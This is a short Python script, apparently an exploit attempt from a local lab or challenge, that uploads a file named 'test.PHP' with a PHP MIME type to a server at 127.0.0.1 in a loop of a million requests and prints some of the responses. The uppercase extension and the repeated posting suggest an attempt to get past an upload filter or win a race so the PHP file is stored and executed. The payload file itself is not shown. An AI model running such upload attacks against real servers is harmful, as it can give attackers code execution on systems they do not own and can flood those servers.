import requests
from time import sleep
import sys


url = "http://127.0.0.1:8000/index.php"



with requests.Session() as session:
    for i in range(1000000):
        files = {'file': ("test.PHP", open("../../test.PHP", "r"), "application/x-httpd-php")}
        headers = {
            'Connection': 'keep-alive'
        }

        response = session.post(url, files=files, headers=headers)

        if i % 1000 == 0:
            print(response.text)
